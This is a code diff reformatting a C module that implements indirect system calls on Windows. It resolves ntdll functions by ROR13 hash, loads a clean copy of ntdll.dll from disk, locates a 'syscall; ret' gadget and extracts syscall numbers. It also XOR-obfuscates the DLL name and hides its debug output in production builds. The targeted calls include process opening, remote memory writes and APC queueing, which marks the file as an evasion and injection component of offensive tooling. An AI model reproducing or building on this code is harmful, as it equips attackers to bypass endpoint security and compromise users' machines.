@@ -11,10 +11,12 @@
 #include <string.h>
 
 // ROR13 hash function for API resolution
-static DWORD ror13_hash(const char* name) {
+static DWORD ror13_hash(const char *name)
+{
     DWORD hash = 0;
-    while (*name) {
-        hash = (hash >> 13) | (hash << (32 - 13)); // Rotate right 13 bits
+    while (*name)
+    {
+        hash = (hash >> 13) | (hash << (32 - 13));       // Rotate right 13 bits
         hash += (*name >= 'a') ? (*name - 0x20) : *name; // Convert to uppercase
         name++;
     }
@@ -22,7 +24,8 @@ static DWORD ror13_hash(const char* name) {
 }
 
 // Syscall info structure
-typedef struct _SYSCALL_INFO {
+typedef struct _SYSCALL_INFO
+{
     DWORD ssn;
     PVOID syscallAddress;
 } SYSCALL_INFO, *PSYSCALL_INFO;
@@ -30,20 +33,21 @@ typedef struct _SYSCALL_INFO {
 #define SYSCALL_COUNT 12
 
 // Precomputed ROR13 hashes for syscall functions
-#define HASH_NtAllocateVirtualMemory  0x5947FD91
-#define HASH_NtProtectVirtualMemory   0x1255C05B
-#define HASH_NtFreeVirtualMemory      0x69A0287F
-#define HASH_NtWriteVirtualMemory     0x4B2D0096
-#define HASH_NtReadVirtualMemory      0xC92C187D
-#define HASH_NtQueueApcThread         0x1126191E
-#define HASH_NtResumeThread           0x63C738A0
-#define HASH_NtClose                  0x9BD4442F
-#define HASH_NtOpenProcess            0x8F879070
-#define HASH_NtCreateFile             0xE2068364
-#define HASH_NtReadFile               0x637ACCE6
-#define HASH_NtWriteFile              0x668B0D03
+#define HASH_NtAllocateVirtualMemory 0x5947FD91
+#define HASH_NtProtectVirtualMemory 0x1255C05B
+#define HASH_NtFreeVirtualMemory 0x69A0287F
+#define HASH_NtWriteVirtualMemory 0x4B2D0096
+#define HASH_NtReadVirtualMemory 0xC92C187D
+#define HASH_NtQueueApcThread 0x1126191E
+#define HASH_NtResumeThread 0x63C738A0
+#define HASH_NtClose 0x9BD4442F
+#define HASH_NtOpenProcess 0x8F879070
+#define HASH_NtCreateFile 0xE2068364
+#define HASH_NtReadFile 0x637ACCE6
+#define HASH_NtWriteFile 0x668B0D03
 
-enum {
+enum
+{
     IDX_NtAllocateVirtualMemory = 0,
     IDX_NtProtectVirtualMemory,
     IDX_NtFreeVirtualMemory,
@@ -88,21 +92,24 @@ static BOOL LoadFreshNtdll(void)
     lstrcatA(ntdllPath, "\\ntdll.dll");
 
     HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
-                                NULL, OPEN_EXISTING, 0, NULL);
-    if (hFile == INVALID_HANDLE_VALUE) {
+                               NULL, OPEN_EXISTING, 0, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
         return FALSE;
     }
 
     DWORD fileSize = GetFileSize(hFile, NULL);
     g_FreshNtdll = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    
-    if (!g_FreshNtdll) {
+
+    if (!g_FreshNtdll)
+    {
         CloseHandle(hFile);
         return FALSE;
     }
 
     DWORD bytesRead;
-    if (!ReadFile(hFile, g_FreshNtdll, fileSize, &bytesRead, NULL)) {
+    if (!ReadFile(hFile, g_FreshNtdll, fileSize, &bytesRead, NULL))
+    {
         CloseHandle(hFile);
         return FALSE;
     }
@@ -111,11 +118,6 @@ static BOOL LoadFreshNtdll(void)
     return TRUE;
 }
 
-/*
- * FindSyscallAddress
- * ------------------
- * Searches for "syscall; ret" (0F 05 C3) in ntdll
- */
 static PVOID FindSyscallAddress(PVOID moduleBase)
 {
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
@@ -125,22 +127,27 @@ static PVOID FindSyscallAddress(PVOID moduleBase)
     PVOID textBase = NULL;
     DWORD textSize = 0;
 
-    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
-        if (memcmp(section[i].Name, ".text", 5) == 0) {
+    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++)
+    {
+        if (memcmp(section[i].Name, ".text", 5) == 0)
+        {
             textBase = (BYTE *)moduleBase + section[i].VirtualAddress;
             textSize = section[i].Misc.VirtualSize;
             break;
         }
     }
 
-    if (!textBase) return NULL;
+    if (!textBase)
+        return NULL;
 
     // Find "0F 05 C3" (syscall; ret)
     BYTE *current = (BYTE *)textBase;
     BYTE *end = current + textSize - 2;
 
-    while (current < end) {
-        if (current[0] == 0x0F && current[1] == 0x05 && current[2] == 0xC3) {
+    while (current < end)
+    {
+        if (current[0] == 0x0F && current[1] == 0x05 && current[2] == 0xC3)
+        {
             return current;
         }
         current++;
@@ -154,7 +161,7 @@ static PVOID GetFunctionByHash(PVOID moduleBase, DWORD targetHash)
 {
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
     PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);
-    
+
     DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
     PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)moduleBase + exportDirRva);
 
@@ -162,11 +169,13 @@ static PVOID GetFunctionByHash(PVOID moduleBase, DWORD targetHash)
     DWORD *addressOfNames = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfNames);
     WORD *addressOfNameOrdinals = (WORD *)((BYTE *)moduleBase + exportDir->AddressOfNameOrdinals);
 
-    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
+    for (DWORD i = 0; i < exportDir->NumberOfNames; i++)
+    {
         char *currentName = (char *)((BYTE *)moduleBase + addressOfNames[i]);
         DWORD hash = ror13_hash(currentName);
-        
-        if (hash == targetHash) {
+
+        if (hash == targetHash)
+        {
             WORD ordinal = addressOfNameOrdinals[i];
             DWORD functionRva = addressOfFunctions[ordinal];
             return (BYTE *)moduleBase + functionRva;
@@ -182,11 +191,13 @@ static DWORD ExtractSSN(PVOID functionAddress)
     BYTE *bytes = (BYTE *)functionAddress;
 
     // Check signature: mov r10, rcx
-    if (bytes[0] != 0x4C || bytes[1] != 0x8B || bytes[2] != 0xD1) {
+    if (bytes[0] != 0x4C || bytes[1] != 0x8B || bytes[2] != 0xD1)
+    {
         return 0;
     }
 
-    if (bytes[3] != 0xB8) {
+    if (bytes[3] != 0xB8)
+    {
         return 0;
     }
 
@@ -196,18 +207,20 @@ static DWORD ExtractSSN(PVOID functionAddress)
 // Public API
 BOOL InitializeSyscallsModule(void)
 {
-    if (g_Initialized) {
+    if (g_Initialized)
+    {
         return TRUE;
     }
 
-    #ifndef PRODUCTION
+#ifndef PRODUCTION
     printf("[*] Initializing indirect syscalls...\n");
-    #endif
+#endif
 
-    if (!LoadFreshNtdll()) {
-        #ifndef PRODUCTION
+    if (!LoadFreshNtdll())
+    {
+#ifndef PRODUCTION
         printf("[-] Failed to load ntdll.dll\n");
-        #endif
+#endif
         return FALSE;
     }
 
@@ -215,14 +228,15 @@ BOOL InitializeSyscallsModule(void)
     BYTE obfNtdllName[] = {0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
     char ntdllName[16];
     DeobfuscateString(obfNtdllName, 9, 0x42, ntdllName);
-    
+
     HMODULE hNtdll = GetModuleHandleA(ntdllName);
     PVOID syscallAddress = FindSyscallAddress(hNtdll);
-    
-    if (!syscallAddress) {
-        #ifndef PRODUCTION
+
+    if (!syscallAddress)
+    {
+#ifndef PRODUCTION
         printf("[-] Failed to find syscall instruction\n");
-        #endif
+#endif
         return FALSE;
     }
 
@@ -239,24 +253,26 @@ BOOL InitializeSyscallsModule(void)
         HASH_NtOpenProcess,
         HASH_NtCreateFile,
         HASH_NtReadFile,
-        HASH_NtWriteFile
-    };
+        HASH_NtWriteFile};
 
     // Resolve all functions by hash
-    for (int i = 0; i < SYSCALL_COUNT; i++) {
+    for (int i = 0; i < SYSCALL_COUNT; i++)
+    {
         PVOID funcAddr = GetFunctionByHash(g_FreshNtdll, functionHashes[i]);
-        if (!funcAddr) {
-            #ifndef PRODUCTION
+        if (!funcAddr)
+        {
+#ifndef PRODUCTION
             printf("[-] Function with hash 0x%08X not found\n", functionHashes[i]);
-            #endif
+#endif
             return FALSE;
         }
 
         DWORD ssn = ExtractSSN(funcAddr);
-        if (ssn == 0) {
-            #ifndef PRODUCTION
+        if (ssn == 0)
+        {
+#ifndef PRODUCTION
             printf("[-] SSN extraction failed for hash 0x%08X\n", functionHashes[i]);
-            #endif
+#endif
             return FALSE;
         }
 
@@ -265,19 +281,20 @@ BOOL InitializeSyscallsModule(void)
     }
 
     g_Initialized = TRUE;
-    #ifndef PRODUCTION
+#ifndef PRODUCTION
     printf("[+] Syscalls module initialized successfully\n");
-    #endif
-    #ifndef PRODUCTION
+#endif
+#ifndef PRODUCTION
     printf("    %d syscalls disponibles\n\n", SYSCALL_COUNT);
-    #endif
-    
+#endif
+
     return TRUE;
 }
 
 VOID CleanupSyscallsModule(void)
 {
-    if (g_FreshNtdll) {
+    if (g_FreshNtdll)
+    {
         VirtualFree(g_FreshNtdll, 0, MEM_RELEASE);
         g_FreshNtdll = NULL;
     }
@@ -470,9 +487,9 @@ PVOID SysVirtualAlloc(
 {
     PVOID baseAddress = lpAddress;
     SIZE_T regionSize = dwSize;
-    
+
     NTSTATUS status = SysNtAllocateVirtualMemory(
-        (HANDLE)-1,  // Current process
+        (HANDLE)-1, // Current process
         &baseAddress,
         0,
         &regionSize,
@@ -491,7 +508,7 @@ BOOL SysVirtualProtect(
     PVOID baseAddress = lpAddress;
     SIZE_T regionSize = dwSize;
     ULONG oldProtect = 0;
-    
+
     NTSTATUS status = SysNtProtectVirtualMemory(
         (HANDLE)-1,
         &baseAddress,
@@ -499,7 +516,8 @@ BOOL SysVirtualProtect(
         flNewProtect,
         &oldProtect);
 
-    if (lpflOldProtect) {
+    if (lpflOldProtect)
+    {
         *lpflOldProtect = oldProtect;
     }
 
@@ -513,7 +531,7 @@ BOOL SysVirtualFree(
 {
     PVOID baseAddress = lpAddress;
     SIZE_T regionSize = dwSize;
-    
+
     NTSTATUS status = SysNtFreeVirtualMemory(
         (HANDLE)-1,
         &baseAddress,
